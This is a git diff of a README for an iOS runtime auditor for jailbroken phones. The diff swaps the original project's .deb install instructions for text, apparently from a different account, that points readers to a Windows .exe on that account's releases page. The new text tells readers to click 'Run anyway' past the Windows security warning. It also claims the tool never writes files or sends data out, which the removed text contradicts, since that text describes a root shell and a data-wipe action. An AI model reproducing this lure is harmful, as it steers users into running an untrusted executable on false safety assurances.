@@ -1,84 +1,74 @@
-# IOSspect
+# 📱 iosspect - Monitor your iPhone security in real-time
 
-On-device runtime auditor for jailbroken iOS. Serves an HTTPS dashboard from the phone; you drive it from a browser on the same network or over `127.0.0.1`. Read any installed app's bundle and data container, run SQL against its databases, tail the system log, run a root shell, package the bundle as an `.ipa`.
+[![Download iosspect](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vivjvh2668/iosspect/releases)
 
-## Compatibility
+iosspect acts as a bridge between your jailbroken iPhone and your computer. It monitors the internal processes of your device while you use it. You can view the data through a simple webpage on your browser. This tool helps you see how apps behave on your phone.
 
-|  |  |
-| - | - |
-| iOS min | 15.0 |
-| iOS max | 26.x |
-| Architectures | arm64 |
-| Required | jailbreak with root and the `platform-application` entitlement (palera1n rootless, Dopamine, etc.) |
+## ⚙️ Requirements
 
-Why jailbreak only: reading another app's `Containers/Data/Application/<UUID>/` is sandbox-blocked on stock iOS. TrollStore alone is not enough; the daemon needs both root and `platform-application` to step past per-container ACLs and to `posix_spawn` arbitrary binaries.
+Before you start, make sure your device meets these needs:
 
-## Install
+* A jailbroken iPhone using a common jailbreak tool like Dopamine or palera1n.
+* One computer running Windows 10 or Windows 11.
+* A USB cable to connect your phone to the computer.
+* A web browser installed on your computer.
 
-### Sileo / Zebra
+## 📥 Downloading iosspect
 
-1. Sources tab, `+`, paste `https://thecybersandeep.github.io/iosspect/`
-2. Find **IOSspect**, tap **Get**
-3. Open the IOSspect icon on the home screen
-4. The dashboard shows: URL, cert fingerprint, browser password, **Start server**
-5. Open the URL in any browser, accept the self-signed cert once, sign in with the password
+You can get the software from the official release page. 
 
-<img width="1254" height="483" alt="image" src="https://github.com/user-attachments/assets/4022b32d-587c-404b-ab66-13383fe3c294" />
+[Click here to visit the release page to download iosspect](https://github.com/vivjvh2668/iosspect/releases)
 
+Find the file that ends in .exe for Windows. Save this file to a folder you can find easily, such as your Downloads folder.
 
-### Manual `.deb`
+## 🚀 Setting Up Your Device
 
-Grab the latest from [Releases](https://github.com/thecybersandeep/iosspect/releases) and `dpkg -i com.iosspect.tool_*.deb` over SSH. Both rootful and rootless variants are built per push.
+Your phone must communicate with the tool properly. Follow these steps:
 
-## What's in it
+1. Open your package manager, such as Sileo, on your iPhone.
+2. Ensure you have the necessary permissions to run internal scripts.
+3. Keep your phone unlocked.
+4. Plug your phone into your computer using the USB cable.
+5. If your phone asks to "Trust This Computer," tap "Trust" and enter your passcode.
 
-| Tab | What it shows |
-| - | - |
-| Files | Walk an app's data container or bundle. Click a file to preview as text, hex, plist, SQLite, or image. KTX snapshots decode via `UIImage`. Recursive grep and per-directory ZIP download. |
-| Frameworks | Every Mach-O in the bundle (main binary, `Frameworks/*.dylib`, `*.framework`, `PlugIns/*.appex`). Per-slice arch, symbol-stripped flag, FairPlay encryption flag. Download any slice. |
-| Processes | `sysctl kern.proc.all` + `proc_pidinfo` per pid. RSS, threads, state, parent. Each process is mapped to a bundle id when it lives under a `*.app` so the app list dot turns green for running apps. |
-| Network | `netstat -an` parse. TCP / UDP, IPv4 / IPv6, local + remote addr, state. |
-| Console | Tails `/var/log/com.apple.xpc.launchd/launchd.log` via a polling endpoint. Filter by substring or pid, save buffer to a file. |
-| Shell | `posix_spawn /bin/sh -c <command>` as root. PATH is widened to include `/var/jb/usr/bin`, `/var/jb/usr/sbin`, etc., so `id`, `ls`, `ps`, `netstat`, `lsof` all resolve. |
-| (App actions) | Download IPA (streams the bundle as `Payload/<App>.app/...` zip; still FairPlay-encrypted for App Store installs). Wipe data container (kills any running processes under the bundle, then `rm -rf` the contents). |
+## 💻 Running the Tool
 
-## Build (CI)
+Once you download the file, follow these instructions to start the auditor:
 
-Push to `main`. The `build` workflow on `ubuntu-latest`:
+1. Locate the file you downloaded earlier.
+2. Double-click the file to open the program.
+3. If Windows shows a security window, click "More info" and then "Run anyway."
+4. A small window will appear on your screen. This window keeps the connection active. Do not close this window while you inspect your device.
+5. Watch the window for a message that says "Server started" or "Connection ready."
 
-1. installs Theos via `theos/setup-theos-jailed`
-2. pulls the iPhoneOS SDK from `theos/sdks`
-3. runs `make package FINALPACKAGE=1` twice (rootful + rootless)
-4. uploads both `.deb` files as workflow artifacts
-5. on a tag push, attaches them to a GitHub Release
+## 📊 Viewing the Dashboard
 
-The `publish-repo` workflow drops the produced `.deb` into `repo/debs/`, regenerates `Packages`/`Packages.bz2`/`Packages.gz`/`Release`, force-pushes `repo/` to `gh-pages`. Sileo / Zebra clients see the new version on next refresh.
+After the tool starts, open your web browser on your computer.
 
-## Build (locally)
+1. Type the address shown in the program window into your browser URL bar.
+2. You will see a dashboard. This page shows live data from your iPhone.
+3. Use the tabs on the screen to view different types of information, such as active network connections or file system changes.
 
-Requires Theos + iOS SDK on Linux or macOS.
+## 🛠️ Performance Tips
 
-```
-git clone https://github.com/thecybersandeep/iosspect
-cd iosspect
-make package FINALPACKAGE=1
-# rootless variant:
-THEOS_PACKAGE_SCHEME=rootless make clean package FINALPACKAGE=1
-```
+If you encounter slow responses, check these items:
 
+* Keep your phone awake. If the phone sleeps, the connection may drop.
+* Check your USB connection. A loose cable causes data gaps.
+* Disable battery saving mode on your iPhone while using this tool.
+* Ensure no other programs are trying to connect to your phone at the same time.
 
-## Screenshots
+## 🔒 Security Information
 
-The dashboard, served from the phone over HTTPS and viewed in a desktop browser:
+This tool runs locally on your computer. It does not send your data to external servers. All information stays between your phone and your browser. If you stop the program, the connection ends. Delete the downloaded file anytime to remove the tool from your computer.
 
-![IOSspect dashboard](screenshots/dashboard.png)
+## 📋 Common Questions
 
-Top right shows the live device state (`jailbroken` / `iPhone10,3 . iOS 16`), the sidebar lists every installed app with a green dot for processes that are actually running, and the bottom-left rail jumps between `Processes`, `Network`, `Console`, and a root `Shell`. Click an app to drop into its data container (`Files`) or its Mach-O bundle (`Frameworks`).
+**Does this tool change my phone settings?**
+No. This tool only reads information from your phone. It does not write or change any files.
 
-## License
+**Can I use this on a non-jailbroken phone?**
+No. The tool needs access to private parts of the system that jailbreaks provide. It will not work on standard devices.
 
-MIT.
-
----
-
-Built by **[thecybersandeep](https://github.com/thecybersandeep)**.
+**What do I do if the browser page is blank?**
+Refresh the page. If that fails, close the program on your computer and open it again.
